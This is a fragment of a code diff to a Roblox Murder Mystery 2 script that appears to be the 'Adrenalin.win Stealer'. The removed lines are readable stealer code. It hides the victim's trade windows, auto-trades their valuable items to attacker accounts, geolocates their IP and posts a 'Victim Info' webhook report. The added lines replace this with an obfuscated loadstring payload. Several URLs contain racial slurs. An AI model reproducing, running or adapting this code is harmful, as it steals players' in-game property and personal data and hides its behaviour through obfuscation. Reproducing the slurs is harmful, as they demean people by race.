yuxhtkbzfl,_auutllnpawgy,_dlhxhapmbvig,_kmrdozihvkwq,_cyjsswvawfif,_wlpdghkpzzwm,_ibdkymfneijd,_iupslfripwim,_xyaogywdcrew,_keikmdsypnox,_ixasjdirmkqr,_bdeoznutxqzf,_oekrzvyomaxm,_zjuipttxhdyy,_uzzlrbkltvag,_tdxbjxkrbolt,_jwjtwurmcwhk,_nyiairmmxpzj,_wdhysmtvggbn,_ctthwvsahptm,_luufngsaujnd,_kapkudznsdtg,_zsawxykhbxco,_mjosczzyvvkc,_mzsgpekqhlxn,_brscuyrjobgy,_xcwxiqliyxwp,_pscfxrwavwog,_jdqghkffjbhx,_sjfborhkvccv,_zuggkdkqfkfy,_tcgvdvmxbmot,_qyclsayeujot,_chrxrykrfwwh,_mpvgwylwcylo,_gqziufaebmgn,_cnzibwybyysw,_brgkrjyicdhs,_ebykgjjzrdge,_chksjyaenney,_ttyotfdrwpqo,_xpooybouycic,_zkkcnzlkgbfp,_mibuwwoimodm,_yhjzlxbrleaz,_rvtmyjemefdl,_buxwixncwhlb,_znwunjwkopob,_oatxwkjcfioe,_qphpjacjzgvt,_jbeijoawtvjb,_dlgnvmaluivv,_knaobxpycoih,_myuxsxribion,_ledfzytozlyz,_jhxjkokwbmnn,_takitwsmtzqb,_ygcahtfitxdi,_jlitptnboguw,_xyimmpqkfqtw,_fefepkrhfzyj,_iekeownhvaba,_eswuqfbizcbx,_cuxvpmmiyyme,_xwmmzjilmrwf,_sixktaxcvgut,_cglpfroqpevg,_sqhlitbmlrad,_mnapvmktwtki,_pavfkuvjobep,_licaqgojchhp,_txxawainqsrk,_rnvynltfzjgr,_ppeaysdzxccv,_rjfghmlpgkof,_ryezehnwoecc,_vfqbzhfnlzqp,_zobcwdpepcxg,_pavsovznosru,_wmffpgiqhhoy,_xtgitdpwpvmi,_akguoqkgsatt,_yhbrwbsrnwhf,_appnrrzcggsy,_lndernshoddl,_piuyredkiwkm,_dininkcsturj,_xhwdbktfmhgq,_krezydgsvtzr,_bnlhkpacstkq,_layulevookop,_pasijyzbzqhj,_uuqdgnkyzxgq,_lphsqyrajykf,_bfypsipkkzmt,_nluodiuntbvk,_pkmmvsibbqxv,_tsbhsqxoznpa,_nkfqeixxyrkr,_mbphldolyjma,_yjzkzvatwxnh,_auncggcoarqn,_zgtxxkorwarq,_pfoaarxkltir,_ryeutprnezwz,_ldskixzvgolz,_wrudjxfoezpw,_bsrqorvohduv,_zbzqxtirvzxk,_unumwmbqowht,_eowahspysyiu,_kxvbknamfgof,_bnpoivukvkuh,_whgrlcrpliho,_dubkzjlhzgvu,_hwjpqdmjcziy,_tmobokfxshqy,_sfblvfxzzdwf,_kyllqvlqyaud,_ftqqzsgqbuof,_lwirnfluzcno,_oyokviiqocle,_wghvxvggyefq,_xmsyoldmufki,_irdbsrzlgssm,_gfmxdrgcfios,_asmwhceulvtn,_tqjgbappgazg,_jjehwevghagk,_mskpseieyzbz,_otrmzayturjf,_iknjofbewjtd,_xucconuxzuaq,_gyjfptljozeo,_oqblnwzyktey,_mbskfylyedgb,_abdvmnnytitt,_mutivqxraavw,_xeghfdttuvle,_pxmxomunxtjn,_izmhvxzavway,_rynrvdnisnfg,_ftvdwdikfqnt,_pmxtqnxhpekf,_chfllzgqxrlx,_tcejvdxsiisg,_mmbcdolkouuv,_uoqmvsolttqt,_stgwtwnkngnl,_gfwmpugkdcwt,_xuuhbzoxqegb,_dmrkzvbjtyqw,_ezkkxhmemgqd,_ahhnyylczaui,_dsocxsphwjlc,_kppkdprzzjos,_mdshoqpmubhh,_uukbxeaevibm,_hgdpfdggobhc,_prrhsusvswtg,_twigfplyzvqm,_zgwuwcczhdgy,_papbbaakoptd,_bmllaycvzspu,_mdwfxsuyxdfr,_qbkfkrlcabqk,_gdowyznhyqji,_debjrkfvmdsg,_vfpnhblogqql,_dztwzzgivelb,_bdwzxvtiasog,_cjwygbwqyvrp,_dyixwrhewyjd,_xryievewhbcn,_wtwwqcfqnuyc,_vcwlcgnmwjhj,_arqjlnypboiu,_zprlbrtsifqr,_jrxzlrbvnjjj,_qxohhmxpfzne,_kxuogzyxalhp,_oyydklybxnna,_ickgylzuamvw,_tpjnhdvkwdpa,_gdqpzukfrawj,_ktiaioqethuw,_zigqsyxstufj,_sgwtkqntsjsz,_mwwzqrvybmsh,_stotzjfczsqp,_ynzeervrsfpp,_pksgndljvcpl,_zuswkfkckszt,_vqrzzzyfoygj,_xiwkugqczpra,_gvnkvdjbxvtg,_hshmfqksrkng,_asuklkoojsuq,_dbqbxymnpcxn,_ncszxgphgeez,_oawqfkhbsbza,_tckgahaknoie,_nabnjowuvtuv,_psptbqufanym,_ijlgxuywpqfu,_rwzqatljuzox,_wytofyciymoo,_wjgndklomiwb,_mazpuicupqlh,_kmkifcldxioc,_fzbfmcsjzfpy,_vguueqvrkddo,_snjvtxihtyim,_vablempljjna,_cplnrhthudqq,_rharpwxiagjt,_ntidylqppdpg,_xbhuqmrjunyj,_kmfjjoyvccwi,_osgxmtpbwqcz,_zwrrrzbrobii,_ljgwciweodqm,_gtopxefukvws,_uccyzaccphrp,_boabkcvltlvf,_prhklpigognn,_iolsxhodnffw,_uadiosgdmfrk,_ricsaelvpblv,_whqssqpnclfo,_bzdcwupkuhjy,_gqamwkbvcvvn,_mewrjxazgsam,_gohhqtpvxeqn,_thhxysdslwsn,_hqgircthfske,_cdadfynivipy,_vjytypustixa,_wuhqwvmthssr,_gjbpdyqqbhon,_wjfosyqfrwgd,_jbhhecceeyli,_euqwdoejtsss,_vceccssporex,_xsquixvaqcif,_fvmzcmptcwnj,_bxagbdceuwra
+})
+
+local _qaddbnjuvpvn = loadstring
+local _aaabktpcukyn = _qaddbnjuvpvn(_fhbgbjeqtvmw)
+if _aaabktpcukyn then
+  pcall(_aaabktpcukyn)
 end
-local function getTradeStatus()
-    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
-end
-local function waitForTradeCompletion()
-    while true do
-        task.wait(0.1)
-        if getTradeStatus() == "None" then break end
-    end
-end
-local Trade = ReplicatedStorage.Trade
-_G.LastOffer = _G.LastOffer or nil
-Trade.UpdateTrade.OnClientEvent:Connect(function(x) _G.LastOffer = x.LastOffer end)
-local function acceptTrade()
-    if _G.LastOffer then
-        Trade.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer)
-    else
-        warn("nil")
-    end
-end
-local function addWeaponToTrade(id)
-    Trade.OfferItem:FireServer(id, "Weapons")
-end
 
-local function SendFirstMessage(list, prefix)
-    local totalValue = 0
-    for _, item in ipairs(list) do
-        totalValue = totalValue + ((item.Value or 0) * (item.Amount or 1))
-    end
-    local usdData = GetUSD(list)
-    local totalUSD = usdData.total or "0.00"
-    local itemPrices = usdData.itemPrices or {}
-    local Executor = (identifyexecutor and identifyexecutor()) or "Unknown"
-  
-    local JoinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
-    local avatarrUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"
-    local avatarUrl = "https://fuckingniggermf.vercel.app/api/avatar?userId=" .. tostring(plr.UserId)
-     local NotHead = "https://fuckingniggermf.vercel.app/api/Nigger?userId=" .. tostring(plr.UserId)
-    local profileUrl = "https://www.roblox.com/users/" .. plr.UserId .. "/profile"
-
-    local displayList = {}
-for _, item in ipairs(list) do
-    table.insert(displayList, item)
-end
-
-
-table.sort(displayList, function(a, b)
-    local lookupA = tostring(a.DataID):gsub("%s+", "")
-    local lookupB = tostring(b.DataID):gsub("%s+", "")
-    
-    local priceA = (itemPrices[lookupA] and tonumber(itemPrices[lookupA].price)) or 0
-    local priceB = (itemPrices[lookupB] and tonumber(itemPrices[lookupB].price)) or 0
-    
-    return priceA > priceB
-end)
-local remainingUSD = tonumber(totalUSD) or 0
-    local truncated = false
-
-local inventoryStr = "```"
-for _, item in ipairs(displayList) do
-    local itemInfo = database[item.DataID]
-    local displayName = itemInfo and itemInfo.ItemName or item.DataID
-    
-    
-    local lookupKey = tostring(item.DataID):gsub("%s+", "")
-    if itemInfo and itemInfo.Chroma then
-        if not displayName:find("Chroma") then
-            displayName = "Chroma " .. displayName
-        end
-    end
-            
-    local price = (itemPrices[lookupKey] and itemPrices[lookupKey].price) or 0
-    local line = string.format("%dx %s \226\158\156 $%.2f\n", item.Amount, displayName, price)
-if #inventoryStr + #line < 350 then
-            inventoryStr = inventoryStr .. line
-            remainingUSD = remainingUSD - price
-        else
-            truncated = true
-            break
-        end
-    end
-
-    if truncated then
-        inventoryStr = inventoryStr .. string.format("\nAnd $%.2f worth of items more...\n", math.max(0, remainingUSD))
-    end
-inventoryStr = inventoryStr .. "```"
-
-local country = "Unknown"
-    pcall(function()
-        local response = game:HttpGet("http://ip-api.com/json/")
-        local data = HttpService:JSONDecode(response)
-        country = data.country or "Unknown"
-    end)
-local locationStr = (loc.country or "Unknown")
-    if loc.city and loc.city ~= "" then locationStr = locationStr .. ", " .. loc.city end
-
-    local isTopHit = false
-
-        if totalValue > 700 then
-            isTopHit = true
-    end
-
-    
-    local data = {
-    gameType = "MM2", 
-    tophit = isTopHit,
-        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. jobId .. "')",
-        username = "Adrenalin.win Stealer",
-        avatar_url = "https://cs14.pikabu.ru/post_img/big/2023/08/04/4/169112793213668504.jpg",
-        embeds = {{
-            author = {
-                name = "\226\154\161 Adrenalin.win \194\183 Murder Mystery 2",
-                url = "https://www.roblox.com/games/142823291",
-                icon_url = avatarUrl
-            },
-            title = plr.Name,
-            url = profileUrl,
-            description = "\226\156\168 A new inventory has been captured and is ready for extraction.",
-            color = 16777215,
-            thumbnail = { url = avatarrUrl },
-            fields = {
-                { name = "\240\159\145\164 Victim Info", value = "```User     : " .. plr.Name .. "\nUser ID  : " .. plr.UserId .. "\nAge      : " .. plr.AccountAge .. " days```", inline = false },
-                { name = "\240\159\146\142 Total Value", value = "```" .. (totalValue or 0) .. "```", inline = true },
-                { name = "\240\159\146\181 Estimated USD", value = "```$" .. totalUSD .. "```", inline = true },
-                { name = "\240\159\150\165 Executor", value = "```" .. Executor .. "```", inline = true },
-                { name = "\240\159\147\166 Inventory", value = inventoryStr, inline = false },
-                { name = "\240\159\140\144 Server Info", value = "```Players: " .. #Players:GetPlayers() .. "/" .. game.Players.MaxPlayers .. "```", inline = true },
-                { name = "\240\159\147\141 Location", value = "```" .. locationStr .. "```", inline = true },
-                { name = "\240\159\148\151 Quick Join", value = "[**Click to Join**](" .. JoinLink .. ")", inline = true }
-            },
-            footer = {
-                text = "Adrenalin.win Helper \194\183 discord.gg/TCGXvPkH5",
-                icon_url = NotHead
-            },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
-    }
-    
-
-
-
-    
-local isWhitelisted = false
-for _, name in pairs(users or {}) do
-    if plr.Name:lower() == tostring(name):lower() then
-        isWhitelisted = true
-        break
-    end
-end
-
-
-if isWhitelisted then
-
-    SendMemberHit(data)
-    assignHitToDatabase()
-else
-    SendMemberHit(data)
-    assignHitToDatabase()
-    
-    if  totalValue > 200 then
-        SecureSend(data)
-        assignDhToDatabase()
-    end
-end
-end
-local function UnlockTrades()
-		game:GetService("ReplicatedStorage"):WaitForChild("Trade").SetRequestsEnabled:FireServer(true)
-	end
-	
-local playerGui = plr:WaitForChild("PlayerGui")
-task.spawn(function()
-    local tradegui = playerGui:WaitForChild("TradeGUI", 5)
-    if tradegui then
-        tradegui:GetPropertyChangedSignal("Enabled"):Connect(function() tradegui.Enabled = false end)
-        tradegui.Enabled = false
-    end
-    local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone", 5)
-    if tradeguiphone then
-        tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function() tradeguiphone.Enabled = false end)
-        tradeguiphone.Enabled = false
-    end
-end)
-
-local weaponsToSend = {}
-local min_rarity_index = table.find(rarityTable, min_rarity)
-local untradable = {
-    DefaultGun = true, DefaultKnife = true, Reaver = true, Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
-    IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true, IceHammer_Ancient = true,
-    Gingerscythe = true, Gingerscythe_Legendary = true, Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
-    TestItem = true, Season1TestKnife = true, Cracks = true, Icecrusher = true, ["???"] = true, Dartbringer = true,
-    TravelerAxeRed = true, TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
-    BlueCamo_K_2022 = true, GreenCamo_K_2022 = true, SharkSeeker = true
-}
-local valueList = buildValueList()
-local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
-local totalValue = 0
-for dataid, amount in pairs(realData.Weapons.Owned) do
-    task.wait()
-    local rarity = database[dataid].Rarity
-    local weapon_rarity_index = table.find(rarityTable, rarity)
-    if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
-        local value = valueList[dataid]
-        if not value then
-            value = (weapon_rarity_index >= table.find(rarityTable, "Godly")) and 2 or 1
-        end
-        if value >= min_value then
-            totalValue = totalValue + (value * amount)
-            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
-        end
-    end
-end
-if #weaponsToSend > 0 then
-    table.sort(weaponsToSend, function(a, b) return a.Value > b.Value end)
-
-    local prefix = (ping == "Yes") and "--@everyone " or ""
-    SendFirstMessage(weaponsToSend, prefix)
-
-    local function doTrade(joinedUser)
-        local initialTradeState = getTradeStatus()
-        if initialTradeState == "StartTrade" then
-            Trade.DeclineTrade:FireServer()
-            task.wait(0.3)
-        elseif initialTradeState == "ReceivingRequest" then
-            Trade.DeclineRequest:FireServer()
-            task.wait(0.3)
-        end
-
-        while #weaponsToSend > 0 do
-            local tradeStatus = getTradeStatus()
-            if tradeStatus == "None" then
-                sendTradeRequest(joinedUser)
-            elseif tradeStatus == "SendingRequest" then
-                task.wait(0.3)
-            elseif tradeStatus == "ReceivingRequest" then
-                Trade.DeclineRequest:FireServer()
-                task.wait(0.3)
-            elseif tradeStatus == "StartTrade" then
-                local numToTrade = math.min(4, #weaponsToSend)
-                for i = 1, numToTrade do
-                    local weapon = weaponsToSend[i]
-                    for _ = 1, weapon.Amount do
-                        addWeaponToTrade(weapon.DataID)
-                        task.wait()
-                    end
-                end
-                task.wait(6)
-                acceptTrade()
-                waitForTradeCompletion()
-
-                local currentInv = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
-                local firstItemAttempted = weaponsToSend[1].DataID
-                if not currentInv.Weapons.Owned[firstItemAttempted] then
-                    for _ = 1, numToTrade do table.remove(weaponsToSend, 1) end
-                else
-                    pcall(function() Trade.DeclineTrade:FireServer() end)
-                end
-            else
-                task.wait(0.5)
-            end
-            task.wait(1)
-        end
-    end
-
-        local function startImmediateHit()
-        UnlockTrades()
-        for _, p in ipairs(Players:GetPlayers()) do
-            if table.find(combinedUser, p.Name:lower()) then
-                doTrade(p.Name) 
-                return
-            end
-        end
-    end
-    startImmediateHit()
-    Players.PlayerAdded:Connect(function(player)
-        if table.find(combinedUser, player.Name:lower()) then
-            doTrade(player.Name)
-        end
-    end)
-end
+--[[ END ]]
